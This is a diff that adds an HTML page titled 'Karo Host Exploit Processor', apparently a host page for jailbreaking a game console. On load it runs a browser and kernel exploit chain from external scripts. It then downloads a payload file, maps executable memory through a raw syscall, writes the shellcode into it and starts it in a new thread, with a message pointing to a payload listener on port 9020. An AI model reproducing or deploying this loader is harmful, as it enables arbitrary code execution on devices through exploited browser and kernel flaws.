@@ -1,0 +1,73 @@
+<html>
+<head>
+<meta charset="utf-8">
+<title>Karo Host Exploit Processor</title>
+<style>
+    body {
+        background-color: #0f111a;
+        color: #ffffff;
+        font-family: system-ui, sans-serif;
+        text-align: center;
+        padding-top: 20vh;
+    }
+    h1 { font-size: 28px; color: #f1c40f; }
+</style>
+<script>
+    var PLfile = localStorage.getItem("PLfile");
+    var LoadedMSG = localStorage.getItem("LoadedMSG");
+    var out_jb = localStorage.getItem("out_jb");
+
+    function LoaderPL() {
+        if (out_jb == "AllPL") {
+            var req = new XMLHttpRequest();
+            req.responseType = "arraybuffer";
+            req.open('GET', PLfile);
+            req.send();
+            req.onreadystatechange = function () {
+                if (req.readyState == 4) {
+                    var PLD = req.response;
+                    var payload_buffer = chain.syscall(477, 0, PLD.byteLength*4, 7, 0x1002, -1, 0);
+                    var pl = p.array_from_address(payload_buffer, PLD.byteLength*4);
+                    var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
+                    var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
+                    tmp.set(new Uint8Array(req.response), 0);
+                    tmp.set(padding, req.response.byteLength);
+                    var shellcode = new Uint32Array(tmp.buffer);
+                    pl.set(shellcode, 0);
+                    var pthread = p.malloc(0x10);
+                    chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_buffer, 0);
+                    allset();
+                }
+            };
+        } else if (out_jb == "JB") {
+            allset();
+        } else if (out_jb == "BinLD") {
+            Binset();
+        }
+    }
+
+    function allset() { document.getElementById("msgs").innerHTML = LoadedMSG; alert(LoadedMSG); }
+    function Binset() { document.getElementById("msgs").innerHTML = "Payload Loaded. Send payloads to port 9020"; alert("Payload Loaded. Send payloads to port 9020"); }
+
+    function checkExploitState() {
+        if (sessionStorage.Exploit != "yes") {
+            setTimeout(poc, 500);
+        } else {
+            LoaderPL();
+        }
+    }
+    
+    window.onload = function() {
+        setTimeout(checkExploitState, 500);
+    };
+</script>
+
+<script src="int64.js"></script>
+<script src="rop.js"></script>
+<script src="kexploit.js"></script>
+<script src="webkit.js"></script>
+</head>
+<body>
+    <h1 id="msgs">Running Exploit Chain... Please Wait</h1>
+</body>
+</html>
